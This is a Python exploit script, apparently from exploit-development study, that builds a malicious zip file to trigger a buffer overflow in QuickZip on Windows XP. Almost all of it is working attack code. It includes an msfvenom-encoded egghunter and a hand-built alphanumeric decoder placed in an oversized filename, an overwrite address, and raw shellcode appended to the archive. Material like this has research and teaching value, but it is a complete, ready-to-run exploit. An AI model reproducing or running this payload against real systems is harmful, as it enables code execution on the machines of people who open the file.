# Author: Michael Music
# Date: 9/18/2019
# Description: Quickzip Buffer Overflow
#  Tested on Windows XP
# Notes: This exploit has a lot of badchars (basically alphanum only)
#  Uses a manually encoded egghunter, tacks on shellcode at the end of the zip file
#  to avoid manually encoding shellcode (screw that!!!)

# Original Author : corelanc0d3r
# Python POC Author: d3c3pt10n
# http://www.corelan.be:8800
#
# Original: March 2010
# Updated: October 2018

from os import remove
from sys import exit


filename = "corelanboom.zip"
target_len = 4068

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

shellcode = 'w00tw00t'

# push edx, pop esp sub esp, 0x28, padding of \x41s
# this should make ESP < EIP and stop any collisions
#shellcode += '\x52\x5C\x83\xEC\x28\x41\x41\x41'

# AND esp,0xFFFFFFF0 which is used to make sure ESP is a multiple of 4
# These both do the same thing, different opcodes
#shellcode += "\x81\xe4\xf0\xff\xff\xff"

# Needed to add 3 \x90s to get it to work. EIP wasn't aligned
# Starting address of the shellcode must be multiple of 4!
shellcode += '\x83\xE4\xF0\x90\x90\x90'

shellcode += "\xbe\x64\x90\xc9\xe3\xda\xc4\xd9\x74\x24\xf4\x5a"
shellcode += "\x33\xc9\xb1\x52\x31\x72\x12\x83\xea\xfc\x03\x16"
shellcode += "\x9e\x2b\x16\x2a\x76\x29\xd9\xd2\x87\x4e\x53\x37"
shellcode += "\xb6\x4e\x07\x3c\xe9\x7e\x43\x10\x06\xf4\x01\x80"
shellcode += "\x9d\x78\x8e\xa7\x16\x36\xe8\x86\xa7\x6b\xc8\x89"
shellcode += "\x2b\x76\x1d\x69\x15\xb9\x50\x68\x52\xa4\x99\x38"
shellcode += "\x0b\xa2\x0c\xac\x38\xfe\x8c\x47\x72\xee\x94\xb4"
shellcode += "\xc3\x11\xb4\x6b\x5f\x48\x16\x8a\x8c\xe0\x1f\x94"
shellcode += "\xd1\xcd\xd6\x2f\x21\xb9\xe8\xf9\x7b\x42\x46\xc4"
shellcode += "\xb3\xb1\x96\x01\x73\x2a\xed\x7b\x87\xd7\xf6\xb8"
shellcode += "\xf5\x03\x72\x5a\x5d\xc7\x24\x86\x5f\x04\xb2\x4d"
shellcode += "\x53\xe1\xb0\x09\x70\xf4\x15\x22\x8c\x7d\x98\xe4"
shellcode += "\x04\xc5\xbf\x20\x4c\x9d\xde\x71\x28\x70\xde\x61"
shellcode += "\x93\x2d\x7a\xea\x3e\x39\xf7\xb1\x56\x8e\x3a\x49"
shellcode += "\xa7\x98\x4d\x3a\x95\x07\xe6\xd4\x95\xc0\x20\x23"
shellcode += "\xd9\xfa\x95\xbb\x24\x05\xe6\x92\xe2\x51\xb6\x8c"
shellcode += "\xc3\xd9\x5d\x4c\xeb\x0f\xf1\x1c\x43\xe0\xb2\xcc"
shellcode += "\x23\x50\x5b\x06\xac\x8f\x7b\x29\x66\xb8\x16\xd0"
shellcode += "\xe1\x07\x4e\xdb\xf6\xef\x8d\xdb\xf9\x54\x18\x3d"
shellcode += "\x93\xba\x4d\x96\x0c\x22\xd4\x6c\xac\xab\xc2\x09"
shellcode += "\xee\x20\xe1\xee\xa1\xc0\x8c\xfc\x56\x21\xdb\x5e"
shellcode += "\xf0\x3e\xf1\xf6\x9e\xad\x9e\x06\xe8\xcd\x08\x51"
shellcode += "\xbd\x20\x41\x37\x53\x1a\xfb\x25\xae\xfa\xc4\xed"
shellcode += "\x75\x3f\xca\xec\xf8\x7b\xe8\xfe\xc4\x84\xb4\xaa"
shellcode += "\x98\xd2\x62\x04\x5f\x8d\xc4\xfe\x09\x62\x8f\x96"
shellcode += "\xcc\x48\x10\xe0\xd0\x84\xe6\x0c\x60\x71\xbf\x33"
shellcode += "\x4d\x15\x37\x4c\xb3\x85\xb8\x87\x77\xb5\xf2\x85"
shellcode += "\xde\x5e\x5b\x5c\x63\x03\x5c\x8b\xa0\x3a\xdf\x39"
shellcode += "\x59\xb9\xff\x48\x5c\x85\x47\xa1\x2c\x96\x2d\xc5"
shellcode += "\x83\x97\x67"

# length is 117, msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EDX -f python
egghunter =  ""
egghunter += "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
egghunter += "\x4a\x4a\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50\x30\x41"
egghunter += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
egghunter += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x63"
egghunter += "\x56\x6d\x51\x7a\x6a\x69\x6f\x64\x4f\x72\x62\x32\x72"
egghunter += "\x30\x6a\x34\x42\x42\x78\x68\x4d\x34\x6e\x67\x4c\x63"
egghunter += "\x35\x62\x7a\x44\x34\x6a\x4f\x4f\x48\x62\x57\x30\x30"
egghunter += "\x56\x50\x31\x64\x4e\x6b\x79\x6a\x6c\x6f\x50\x75\x38"
egghunter += "\x6a\x4c\x6f\x61\x65\x6a\x47\x4b\x4f\x78\x67\x41\x41"

decoder = ""

# Zero out EAX
#decoder = '\x25\x4a\x4d\x4e\x55'
#decoder += '\x25\x35\x32\x31\x2a'

# PUSH ESP, POP EAX
# EAX now contains ESP
decoder += '\x54'
decoder += '\x58'

#Address we want ESP at: 0x0012FBF2
#Current ESP is: 0x0012F5C0
# 55554d30
# 55554430
# 55555f6e

decoder += '\x2d\x30\x4d\x55\x55'
decoder += '\x2d\x30\x4d\x55\x55'
decoder += '\x2d\x6e\x5f\x55\x55'

# subtracting these from EAX will get EAX to point to 0x0012FBDE
# set ESP to the address created above, which is in EAX
decoder += '\x50\x5c' # PUSH EAX, POP ESP

decoder += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
decoder += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
decoder += "\x05\x11\x77\x62\x31" ## add  eax, 0x31627711
decoder += "\x05\x11\x66\x51\x22" ## add  eax, 0x22516611
decoder += "\x05\x11\x55\x62\x21" ## add  eax, 0x21625511
decoder += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
decoder += "\x50"                 ## push eax

decoder += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
decoder += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
decoder += "\x05\x65\x66\x75\x12" ## add  eax, 0x12756665
decoder += "\x05\x54\x65\x64\x21" ## add  eax, 0x21646554
decoder += "\x05\x34\x46\x54\x12" ## add  eax, 0x12544634
decoder += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
decoder += "\x50"                 ## push eax

payload = '\x41' * 8 + egghunter + '\x41' * (294 - 120 - 8 - len(egghunter)) + '\x41' * 4 + decoder + ('\x41' * (120 - 4 - len(decoder))) + '\x41\x41\x75\x9F' + '\x33\x7a\x40\x00' + ( '\x44' * (4064 - 294 - 4 - 4))
payload = payload + ".txt"
payload_len = len(payload)

if payload_len != 4068:
    print(
        "[!] Filename payload is length {payload_len}, expected {target_len}".format(
            payload_len=payload_len, target_len=target_len
        )
    )
    exit(1)

print("[*] Size : {length} bytes".format(length=payload_len))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header + shellcode
    f.write(file_content)
